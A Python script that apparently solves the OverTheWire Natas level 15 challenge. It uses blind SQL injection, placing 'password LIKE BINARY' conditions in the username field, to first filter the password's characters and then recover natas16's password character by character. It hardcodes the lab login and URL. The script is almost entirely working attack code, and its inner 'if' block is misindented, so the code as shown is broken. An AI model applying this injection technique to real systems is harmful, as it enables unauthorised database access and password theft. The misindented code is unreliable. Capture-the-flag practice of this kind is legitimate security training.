    import requests
    from requests.auth import HTTPBasicAuth
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    filtered = ''
    passwd = ''
    def main():
        global filtered
        global chars
        global passwd
        for char in chars:
            Data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
            r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug",auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
            if 'exists' in r.text:
                filtered = filtered + char
        print("Prepared filtered: ",filtered)
        
        print("main sample")        
        for i in range(0,32):
            print("iteration", i)
            for char in filtered:
                Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
                r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
          if 'exists' in r.text :
                  passwd = passwd + char
                  print(passwd)
                  break
        return
    if __name__ == '__main__':
        main()
